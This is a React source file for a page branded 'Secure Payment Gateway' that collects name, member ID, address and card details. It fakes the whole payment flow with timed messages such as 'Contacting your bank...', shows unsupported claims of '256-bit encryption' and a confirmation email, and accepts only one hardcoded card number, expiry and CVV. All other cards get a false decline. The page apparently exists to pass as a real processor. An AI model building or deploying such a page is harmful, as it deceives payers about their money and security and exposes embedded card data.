import { useState } from 'react'
import { ChakraProvider, Box, Button, FormControl, FormLabel, Input, Heading, Text, VStack, Alert, AlertIcon, useBreakpointValue, HStack, Icon, keyframes, usePrefersReducedMotion, Image, SlideFade, ScaleFade, Spinner, Center, Divider, Wrap, Stack } from '@chakra-ui/react'
import { VisaIcon, MastercardIcon } from './components/CardIcons'
import { LoadingOverlay } from './components/LoadingOverlay'
import { SecurityBadge } from './components/SecurityBadge'
import { LockIcon } from './components/icons/LockIcon'
import { detectCardType, formatCardNumber, formatExpiryDate } from './utils/cardUtils'
import { PAYMENT_AMOUNT, TEST_CARD, PROCESSING_STAGES, VISA_LOGO } from './constants'
import './styles/animations.css'

const SuccessCheckmark = () => (
  <Box
    className="success-checkmark"
    position="relative"
    width="80px"
    height="80px"
  >
    <Box className="check-icon">
      <Box 
        className="icon-background"
        animation="fill-background 0.4s ease-in-out forwards"
      />
      <Box className="icon">
        <Box 
          className="icon-line line-tip"
          animation="icon-line-tip 0.75s ease-in-out forwards"
        />
        <Box 
          className="icon-line line-long"
          animation="icon-line-long 0.75s ease-in-out forwards"
        />
      </Box>
    </Box>
  </Box>
)

function App() {
  const [step, setStep] = useState(1)
  const [isLoading, setIsLoading] = useState(false)
  const [isProcessing, setIsProcessing] = useState(false)
  const [fullName, setFullName] = useState('')
  const [address, setAddress] = useState('')
  const [cardName, setCardName] = useState('')
  const [clientId, setClientId] = useState('')
  const [error, setError] = useState('')

  // Add new state for card details
  const [cardNumber, setCardNumber] = useState('')
  const [expiryDate, setExpiryDate] = useState('')
  const [cvv, setCvv] = useState('')
  const [paymentError, setPaymentError] = useState('')
  const [cardType, setCardType] = useState(null)
  const [processingStage, setProcessingStage] = useState(0)
  const [showCardLogo, setShowCardLogo] = useState(false)
  
  // Add new state for transaction ID
  const [transactionId] = useState(Math.random().toString(36).substr(2, 9).toUpperCase())
  
  // Processing stages with their respective delays (in ms)
  const PROCESSING_STAGES = [
    { message: "Initiating secure payment...", delay: 1800 },     // Initial handshake
    { message: "Encrypting card details...", delay: 1200 },       // Encryption
    { message: "Contacting your bank...", delay: 2800 },         // Network latency to bank
    { message: "Verifying payment details...", delay: 3500 },    // Bank verification
    { message: "Processing with merchant...", delay: 2400 },     // Merchant processing
    { message: "Confirming transaction...", delay: 2100 },       // Final confirmation
    { message: "Payment successful!" }                           // Success message
  ]

  // Smooth fade in animation
  const fadeIn = keyframes`
    from { opacity: 0; transform: translateY(-10px); }
    to { opacity: 1; transform: translateY(0); }
  `

  const prefersReducedMotion = usePrefersReducedMotion()
  const animation = prefersReducedMotion
    ? undefined
    : `${fadeIn} 0.3s ease-in-out`

  // Test card details (replace these with your client's test card)
  const TEST_CARD = {
    number: '4658598163901044',
    expiry: '12/28',
    cvv: '726'
  }

  // Simulate initial page load
  useState(() => {
    setTimeout(() => setIsLoading(false), 1000)
  }, [])

  const handleSubmit = async (e) => {
    e.preventDefault()
    if (fullName.trim() === '' || address.trim() === '' || cardName.trim() === '') {
      setError('All fields are required.')
      return
    }
    if (fullName.trim() !== cardName.trim()) {
      setError('Card must be under the same name as Member ID official name.')
      return
    }
    setError('')
    setIsProcessing(true)
    // Simulate API call
    await new Promise(resolve => setTimeout(resolve, 800))
    setIsProcessing(false)
    setStep(2)
  }

  const handlePayment = async (e) => {
    e.preventDefault()
    setPaymentError('')
    setProcessingStage(0)
    setIsProcessing(true)

    // Basic card number validation (remove spaces)
    const cleanCardNumber = cardNumber.replace(/\s/g, '')
    
    try {
      // Always start the payment process regardless of card details
      for (let i = 0; i < 4; i++) { // Process until verification stage
        setProcessingStage(i)
        const baseDelay = PROCESSING_STAGES[i].delay
        const randomVariation = Math.random() * 800 - 400 // Random value between -400 and +400ms
        await new Promise(resolve => setTimeout(resolve, baseDelay + randomVariation))
      }

      // Check card details during verification stage
      if (cleanCardNumber === TEST_CARD.number && 
          expiryDate === TEST_CARD.expiry && 
          cvv === TEST_CARD.cvv) {
        
        // Continue with successful payment flow
        for (let i = 4; i < PROCESSING_STAGES.length - 1; i++) {
          setProcessingStage(i)
          const baseDelay = PROCESSING_STAGES[i].delay
          const randomVariation = Math.random() * 800 - 400
          await new Promise(resolve => setTimeout(resolve, baseDelay + randomVariation))
        }
        
        // Show success message briefly
        setProcessingStage(PROCESSING_STAGES.length - 1)
        await new Promise(resolve => setTimeout(resolve, 1200))
        
        setStep(3)
      } else {
        // Fail during verification stage with a slight delay
        await new Promise(resolve => setTimeout(resolve, 800))
        setPaymentError('Payment declined: Card verification failed. Please check your card details and try again.')
      }
    } catch (error) {
      setPaymentError('An error occurred while processing your payment. Please try again.')
    }
    
    setIsProcessing(false)
    setProcessingStage(0)
  }

  const handleCardNumberChange = (e) => {
    const formatted = formatCardNumber(e.target.value)
    setCardNumber(formatted)
    
    // Clear the timeout if it exists
    if (window.cardLogoTimeout) {
      clearTimeout(window.cardLogoTimeout)
    }

    // Hide logo immediately when typing/deleting
    setShowCardLogo(false)
    
    const detectedType = detectCardType(formatted)
    setCardType(detectedType)

    // Only show logo after full number is entered and a small delay
    if (detectedType && formatted.replace(/\s/g, '').length === 16) {
      window.cardLogoTimeout = setTimeout(() => {
        setShowCardLogo(true)
      }, 300)
    }
  }

  const handleExpiryChange = (e) => {
    setExpiryDate(formatExpiryDate(e.target.value))
  }

  const formWidth = useBreakpointValue({ base: '100%', sm: '400px' })

  if (isLoading) {
    return (
      <ChakraProvider>
        <Box 
          minH="100vh" 
          w="100vw"
          bg="gray.800" 
          display="flex" 
          alignItems="center" 
          justifyContent="center"
        >
          <Center>
            <Spinner
              thickness="4px"
              speed="0.65s"
              emptyColor="gray.200"
              color="blue.500"
              size="xl"
            />
          </Center>
        </Box>
      </ChakraProvider>
    )
  }

  return (
    <ChakraProvider>
      <style>
        {`
          @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
          }
          @keyframes slideUp {
            from {
              opacity: 0;
              transform: translateY(16px);
            }
            to {
              opacity: 1;
              transform: translateY(0);
            }
          }
          @keyframes gridMove {
            0% {
              background-position: 0 0;
            }
            100% {
              background-position: 60px 60px;
            }
          }
          @keyframes dotPulse {
            0%, 100% { opacity: 0.12; }
            50% { opacity: 0.08; }
          }
          @keyframes gradientFlow {
            0% {
              background-position: 0% 50%;
            }
            50% {
              background-position: 100% 50%;
            }
            100% {
              background-position: 0% 50%;
            }
          }
          .animated-gradient {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(
              135deg,
              rgb(243, 244, 246) 0%,
              rgb(237, 242, 247) 20%,
              rgb(226, 232, 240) 30%,
              rgb(237, 242, 247) 60%,
              rgb(247, 250, 252) 80%,
              rgb(243, 244, 246) 100%
            );
            background-size: 400% 400%;
            animation: gradientFlow 15s ease infinite;
            pointer-events: none;
          }
          .animated-overlay {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(
              135deg,
              rgba(49, 130, 206, 0.05),
              rgba(49, 130, 206, 0.02) 50%,
              rgba(66, 153, 225, 0.03) 75%,
              rgba(49, 130, 206, 0.05)
            );
            background-size: 200% 200%;
            animation: gradientFlow 10s ease infinite;
            pointer-events: none;
          }
          .animated-grid {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-image: 
              radial-gradient(circle at center, rgba(166, 166, 166, 0.15) 1px, transparent 1px),
              radial-gradient(circle at center, rgba(166, 166, 166, 0.1) 1px, transparent 1px),
              linear-gradient(rgba(166, 166, 166, 0.1) 1.5px, transparent 1.5px),
              linear-gradient(90deg, rgba(166, 166, 166, 0.1) 1.5px, transparent 1.5px);
            background-size: 
              35px 35px,
              35px 35px,
              35px 35px,
              35px 35px;
            background-position:
              0 0,
              17.5px 17.5px,
              0 0,
              0 0;
            animation: gridMove 18s linear infinite;
            pointer-events: none;
          }
          .animated-dots {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-image: 
              radial-gradient(circle at center, rgba(136, 136, 136, 0.12) 1.5px, transparent 1.5px),
              radial-gradient(circle at center, rgba(96, 96, 96, 0.1) 1px, transparent 1px);
            background-size: 35px 35px;
            background-position: 0 0, 17.5px 17.5px;
            animation: gridMove 18s linear infinite, dotPulse 3s ease-in-out infinite;
            pointer-events: none;
          }
          .form-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            opacity: 0;
            visibility: hidden;
            transform: translateX(20px);
            transition: opacity 0.3s ease-in-out, transform 0.3s ease-in-out;
            pointer-events: none;
          }
          .form-container.active {
            opacity: 1;
            visibility: visible;
            transform: translateX(0);
            pointer-events: all;
            position: relative;
          }
          
          .forms-wrapper {
            position: relative;
            width: 100%;
          }

          /* Add specific styles for success step */
          .form-container.success {
            padding-top: 20px;  /* Add minimal top padding */
          }

          .payment-form {
            width: 100%;
            max-width: 600px;
            margin: 0 auto;
            display: flex;
            flex-direction: column;
            gap: 16px;
          }

          .payment-form-step2 {
            gap: 12px;  /* Slightly reduced gap for better spacing */
          }

          .security-badges {
            margin-top: 4px;  /* Reduced from 8px */
            width: 100%;
            display: flex;
            justify-content: center;
          }

          .security-badges-wrapper {
            max-width: 650px;
            width: 100%;
            margin: 0 auto;
          }

          .card-logo-container {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            display: flex;
            alignItems: center;
            justifyContent: center;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s ease-in-out, visibility 0.3s ease-in-out;
            pointer-events: none;
          }
          .card-logo-container.visible {
            opacity: 1;
            visibility: visible;
          }
          .card-logo {
            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
          }
          .success-checkmark {
            margin: 0 auto;
          }
          .check-icon {
            width: 80px;
            height: 80px;
            position: relative;
            border-radius: 50%;
            box-sizing: content-box;
            border: 4px solid #4CAF50;
            transform: scale(1);
            opacity: 1;
            animation: check-icon-appear 0.3s ease-in-out forwards;
          }
          .icon-background {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: #4CAF50;
            position: absolute;
            transform: scale(0);
          }
          .icon {
            height: 80px;
            width: 80px;
            position: absolute;
            transform: scale(0.84);
          }
          .icon-line {
            height: 5px;
            background-color: #fff;
            display: block;
            border-radius: 2px;
            position: absolute;
            z-index: 10;
            opacity: 0;
          }
          .icon-line.line-tip {
            top: 46px;
            left: 14px;
            width: 25px;
            transform: rotate(45deg);
          }
          .icon-line.line-long {
            top: 38px;
            right: 8px;
            width: 47px;
            transform: rotate(-45deg);
          }
          @keyframes check-icon-appear {
            0% {
              transform: scale(0.5);
              opacity: 0;
            }
            100% {
              transform: scale(1);
              opacity: 1;
            }
          }
          @keyframes fill-background {
            0% {
              transform: scale(0);
            }
            100% {
              transform: scale(1);
            }
          }
          @keyframes icon-line-tip {
            0% {
              width: 0;
              left: 1px;
              top: 19px;
              opacity: 0;
            }
            30% {
              opacity: 1;
            }
            54% {
              width: 0;
              left: 1px;
              top: 19px;
            }
            70% {
              width: 50px;
              left: -8px;
              top: 37px;
            }
            84% {
              width: 17px;
              left: 21px;
              top: 48px;
            }
            100% {
              width: 25px;
              left: 14px;
              top: 46px;
              opacity: 1;
            }
          }
          @keyframes icon-line-long {
            0% {
              width: 0;
              right: 46px;
              top: 54px;
              opacity: 0;
            }
            30% {
              opacity: 1;
            }
            65% {
              width: 0;
              right: 46px;
              top: 54px;
            }
            84% {
              width: 55px;
              right: 0px;
              top: 35px;
            }
            100% {
              width: 47px;
              right: 8px;
              top: 38px;
              opacity: 1;
            }
          }
          @keyframes scaleIn {
            0% {
              transform: scale(0);
              opacity: 0;
            }
            60% {
              transform: scale(1.1);
              opacity: 1;
            }
            100% {
              transform: scale(1);
              opacity: 1;
            }
          }

          @keyframes drawCheck {
            0% {
              stroke-dashoffset: 100;
              opacity: 0;
            }
            20% {
              opacity: 1;
            }
            100% {
              stroke-dashoffset: 0;
              opacity: 1;
            }
          }

          .success-circle {
            animation: scaleIn 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
          }

          .success-check {
            stroke-dasharray: 100;
            stroke-dashoffset: 100;
            animation: drawCheck 1s 0.6s cubic-bezier(0.65, 0, 0.35, 1) forwards;
          }

          /* Add styles for small screen scaling */
          @media screen and (max-width: 380px) {
            .form-container-wrapper {
              transform: scale(0.85);
              transform-origin: top center;
              width: 117.65%; /* 100/0.85 to compensate for scale */
              margin-left: -8.825%; /* Half of the extra width */
              margin-bottom: -15%; /* Compensate for the scaled height */
            }
          }

          @media screen and (max-width: 340px) {
            .form-container-wrapper {
              transform: scale(0.75);
              width: 133.33%; /* 100/0.75 */
              margin-left: -16.665%;
              margin-bottom: -25%; /* Compensate for the scaled height */
            }
          }
        `}
      </style>
      <Box 
        minH="100vh" 
        w="100vw"
        display="flex" 
        alignItems="center" 
        justifyContent="center"
        p={6}
        position="relative"
        overflow="hidden"
      >
        <Box className="animated-gradient" />
        <Box className="animated-overlay" />
        <Box className="animated-grid" />
        <Box className="animated-dots" />
        <Box
          position="absolute"
          top={0}
          left={0}
          right={0}
          bottom={0}
          background="linear-gradient(135deg, rgba(49, 130, 206, 0.05) 0%, rgba(49, 130, 206, 0.02) 50%, rgba(66, 153, 225, 0.03) 100%)"
          pointerEvents="none"
        />
        
        <Box
          position="absolute"
          top={6}
          left={6}
          p={3}
          bg="white"
          borderRadius="lg"
          boxShadow="sm"
          backgroundColor="white"
        >
          <Text fontSize="sm" fontWeight="semibold" color="gray.700">
            Secure Payment Gateway
          </Text>
        </Box>

        <ScaleFade in={true} initialScale={0.9}>
          <Box className="form-container-wrapper">
            <Box 
              maxW={step === 1 ? "800px" : "700px"}
              w="100%"
              bg="white" 
              p={{ base: 4, sm: 6, md: 8 }}
              borderRadius="2xl" 
              boxShadow="2xl"
              transition="all 0.3s ease-in-out"
              position="relative"
              overflow="hidden"
              borderWidth="1px"
              borderColor="gray.100"
              mx="auto"
            >
              {isProcessing && <LoadingOverlay 
                message={
                  step === 1 
                    ? "Verifying your details..." 
                    : PROCESSING_STAGES[processingStage].message
                } 
              />}

              <VStack spacing={4} align="stretch">
                {step !== 3 && (
                  <>
                    <Box textAlign="center" mb={2}>
                      <HStack justify="center" mb={2}>
                        <Icon as={LockIcon} color="blue.500" boxSize={5} />
                        <Heading as="h1" size="lg" color="gray.700">
                          Secure Payment
                        </Heading>
                      </HStack>
                      <Text color="gray.500" fontSize="sm">Transaction ID: {transactionId}</Text>
                    </Box>

                    <Box 
                      bg="blue.50" 
                      p={4}
                      borderRadius="lg" 
                      borderLeft="4px" 
                      borderLeftColor="blue.500"
                      mb={4}
                    >
                      <HStack>
                        <Box flexShrink={0}>
                          <Text fontWeight="medium" color="gray.700">Amount Due:</Text>
                        </Box>
                        <Box flex={1}>
                          <Text fontWeight="bold" fontSize="xl" color="blue.700">£{PAYMENT_AMOUNT.toFixed(2)}</Text>
                        </Box>
                        <Box>
                          <Text fontSize="sm" color="gray.500">GBP</Text>
                        </Box>
                      </HStack>
                    </Box>
                  </>
                )}

                <Box position="relative">
                  <Box className="forms-wrapper">
                    {/* Step 1: Personal Details */}
                    <Box 
                      className={`form-container ${step === 1 ? 'active' : ''}`}
                    >
                      <form onSubmit={handleSubmit} className="payment-form">
                        <FormControl>
                          <FormLabel color="gray.700" fontSize={{ base: "sm", sm: "md" }}>
            Full Name
                          </FormLabel>
                          <Input
              type="text"
              value={fullName}
              onChange={e => setFullName(e.target.value)}
              placeholder="Enter your full name"
                            size={{ base: "md", sm: "lg" }}
                            height={{ base: "40px", sm: "50px" }}
                            fontSize={{ base: "sm", sm: "md" }}
                            bg="gray.50"
                            border="2px solid"
                            borderColor="gray.200"
                            _hover={{
                              borderColor: "gray.300"
                            }}
                            _focus={{
                              borderColor: "blue.500",
                              bg: "white",
                              boxShadow: "0 0 0 1px var(--chakra-colors-blue-500)"
                            }}
                            required
                          />
                        </FormControl>

                        <FormControl>
                          <FormLabel color="gray.700" fontSize={{ base: "sm", sm: "md" }}>
                            Member ID
                          </FormLabel>
                          <Input
                            type="text"
                            value={clientId}
                            onChange={e => {
                              const value = e.target.value.replace(/\D/g, '').slice(0, 12);
                              setClientId(value);
                            }}
                            placeholder="Enter your member ID"
                            size={{ base: "md", sm: "lg" }}
                            height={{ base: "40px", sm: "50px" }}
                            fontSize={{ base: "sm", sm: "md" }}
                            bg="gray.50"
                            border="2px solid"
                            borderColor="gray.200"
                            _hover={{
                              borderColor: "gray.300"
                            }}
                            _focus={{
                              borderColor: "blue.500",
                              bg: "white",
                              boxShadow: "0 0 0 1px var(--chakra-colors-blue-500)"
                            }}
                            maxLength={12}
                            pattern="\d*"
                            inputMode="numeric"
              required
            />
                        </FormControl>

                        <FormControl>
                          <FormLabel color="gray.700" fontSize={{ base: "sm", sm: "md" }}>
                            Address
                          </FormLabel>
                          <Input
              type="text"
              value={address}
              onChange={e => setAddress(e.target.value)}
                            placeholder="Enter your address"
                            size={{ base: "md", sm: "lg" }}
                            height={{ base: "40px", sm: "50px" }}
                            fontSize={{ base: "sm", sm: "md" }}
                            bg="gray.50"
                            border="2px solid"
                            borderColor="gray.200"
                            _hover={{
                              borderColor: "gray.300"
                            }}
                            _focus={{
                              borderColor: "blue.500",
                              bg: "white",
                              boxShadow: "0 0 0 1px var(--chakra-colors-blue-500)"
                            }}
              required
            />
                        </FormControl>

                        <FormControl>
                          <FormLabel color="gray.700" fontSize="md" mb={2}>
            Name on Card
                          </FormLabel>
                          <Input
              type="text"
              value={cardName}
              onChange={e => setCardName(e.target.value)}
              placeholder="Enter the name on your card"
                            size="lg"
                            height="50px"
                            fontSize="md"
                            bg="gray.50"
                            border="2px solid"
                            borderColor="gray.200"
                            _hover={{
                              borderColor: "gray.300"
                            }}
                            _focus={{
                              borderColor: "blue.500",
                              bg: "white",
                              boxShadow: "0 0 0 1px var(--chakra-colors-blue-500)"
                            }}
              required
            />
                        </FormControl>

                        {error && (
                          <Alert status="error" borderRadius="md">
                            <AlertIcon />
                            {error}
                          </Alert>
                        )}

                        <Button 
                          colorScheme="blue" 
                          type="submit" 
                          size="lg" 
                          height="50px"
                          fontSize="md"
                          mt={2}
                          _hover={{
                            transform: 'translateY(-1px)',
                            boxShadow: 'lg',
                          }}
                        >
                          Continue to Payment
                        </Button>
        </form>
                    </Box>

                    {/* Step 2: Card Details */}
                    <Box 
                      className={`form-container ${step === 2 ? 'active' : ''}`}
                    >
                      <form onSubmit={handlePayment} className="payment-form payment-form-step2">
                        <VStack spacing={4} align="stretch">
                          <FormControl>
                            <FormLabel color="gray.700">
                              <HStack spacing={1} align="center">
                                <Text>Card Number</Text>
                                <Icon as={LockIcon} color="blue.500" boxSize={4} />
                              </HStack>
                            </FormLabel>
                            <Box position="relative">
                              <Input
                                type="text"
                                value={cardNumber}
                                onChange={handleCardNumberChange}
                                placeholder="4658 5981 6390 1044"
                                size="lg"
                                pr="60px"
                                bg="gray.50"
                                border="2px solid"
                                borderColor="gray.200"
                                _hover={{
                                  borderColor: "gray.300"
                                }}
                                _focus={{
                                  borderColor: "blue.500",
                                  bg: "white",
                                  boxShadow: "0 0 0 1px var(--chakra-colors-blue-500)"
                                }}
                                required
                              />
                              <Box
                                className={`card-logo-container ${cardType && showCardLogo ? 'visible' : ''}`}
                              >
                                {cardType === 'visa' ? (
                                  <VisaIcon />
                                ) : cardType === 'mastercard' ? (
                                  <MastercardIcon />
                                ) : null}
                              </Box>
                            </Box>
                          </FormControl>

                          <Stack 
                            direction={{ base: "column", sm: "row" }} 
                            spacing={{ base: 4, sm: 4 }}
                            w="100%"
                          >
                            <FormControl>
                              <FormLabel color="gray.700" fontSize={{ base: "sm", sm: "md" }}>
                                Expiry Date
                              </FormLabel>
                              <Input
                                type="text"
                                value={expiryDate}
                                onChange={handleExpiryChange}
                                placeholder="MM/YY"
                                size={{ base: "md", sm: "lg" }}
                                height={{ base: "40px", sm: "50px" }}
                                fontSize={{ base: "sm", sm: "md" }}
                                bg="gray.50"
                                border="2px solid"
                                borderColor="gray.200"
                                _hover={{
                                  borderColor: "gray.300"
                                }}
                                _focus={{
                                  borderColor: "blue.500",
                                  bg: "white",
                                  boxShadow: "0 0 0 1px var(--chakra-colors-blue-500)"
                                }}
                                required
                              />
                            </FormControl>
                            <FormControl>
                              <FormLabel color="gray.700">
                                <HStack spacing={1} align="center">
                                  <Text>CVV</Text>
                                  <Icon as={LockIcon} color="blue.500" boxSize={4} />
                                </HStack>
                              </FormLabel>
                              <Input
                                type="text"
                                value={cvv}
                                onChange={e => setCvv(e.target.value.slice(0, 3))}
                                placeholder="123"
                                size="lg"
                                maxLength={3}
                                bg="gray.50"
                                border="2px solid"
                                borderColor="gray.200"
                                _hover={{
                                  borderColor: "gray.300"
                                }}
                                _focus={{
                                  borderColor: "blue.500",
                                  bg: "white",
                                  boxShadow: "0 0 0 1px var(--chakra-colors-blue-500)"
                                }}
                                required
                              />
                            </FormControl>
                          </Stack>

                          {paymentError && (
                            <Alert status="error" borderRadius="md">
                              <AlertIcon />
                              {paymentError}
                            </Alert>
                          )}

                          <Button 
                            colorScheme="blue" 
                            type="submit" 
                            size={{ base: "md", sm: "lg" }}
                            height={{ base: "40px", sm: "50px" }}
                            fontSize={{ base: "sm", sm: "md" }}
                            _hover={{
                              transform: 'translateY(-1px)',
                              boxShadow: 'lg',
                            }}
                            mb={1}
                          >
                            Pay £{PAYMENT_AMOUNT.toFixed(2)}
                          </Button>

                          <Divider />
                          
                          <Box className="security-badges">
                            <Box className="security-badges-wrapper">
                              <Stack 
                                direction={{ base: "column", sm: "row" }}
                                spacing={{ base: 2, sm: 4 }} 
                                justify="center" 
                                width="100%"
                                px={{ base: 2, sm: 0 }}
                              >
                                <SecurityBadge 
                                  icon={LockIcon}
                                  text="256-bit encryption"
                                />
                                <SecurityBadge 
                                  icon={LockIcon}
                                  text="Bank-level security"
                                />
                              </Stack>
                            </Box>
                          </Box>
                        </VStack>
                      </form>
                    </Box>
                  </Box>

                  {/* Step 3: Success */}
                  <Box 
                    className={`form-container ${step === 3 ? 'active' : ''}`}
                  >
                    <VStack spacing={8} py={8}>
                      <VStack spacing={2}>
                        <HStack spacing={2}>
                          <Icon as={LockIcon} color="blue.500" boxSize={6} />
                          <Heading size="lg" color="gray.700">
                            Secure Payment
                          </Heading>
                        </HStack>
                        <Text color="gray.500" fontSize="sm">
                          Transaction ID: {transactionId}
                        </Text>
                      </VStack>

                      <Box 
                        key={step}  // Add key to force remount
                        w="80px" 
                        h="80px" 
                        bg="blue.500" 
                        borderRadius="full" 
                        display="flex" 
                        alignItems="center" 
                        justifyContent="center"
                        className="success-circle"
                      >
                        <Icon 
                          viewBox="0 0 24 24" 
                          boxSize={10} 
                          color="white"
                          className="success-check"
                          as="svg"
                        >
                          <path
                            fill="none"
                            stroke="currentColor"
                            strokeWidth="3"
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            d="M20 6L9 17L4 12"
                          />
                        </Icon>
                      </Box>

                      <VStack spacing={3}>
                        <Heading size="lg" color="gray.700">
                          Payment Successful
                        </Heading>
                        
                        <Text color="gray.600" textAlign="center">
                          Your payment of <Text as="span" color="blue.600" fontWeight="semibold">£{PAYMENT_AMOUNT.toFixed(2)}</Text> has been processed successfully.
                        </Text>
                        
                        <Text fontSize="sm" color="gray.500">
                          A confirmation email will be sent shortly.
                        </Text>
                      </VStack>
                    </VStack>
                  </Box>
                </Box>
              </VStack>
            </Box>
          </Box>
        </ScaleFade>

        <Text 
          position="absolute" 
          bottom={6}
          left={0}
          right={0}
          color="gray.600" 
          fontSize="sm"
          textAlign="center"
          fontWeight="medium"
        >
          Protected by industry-leading encryption and security protocols
        </Text>
      </Box>
    </ChakraProvider>
  )
}

export default App
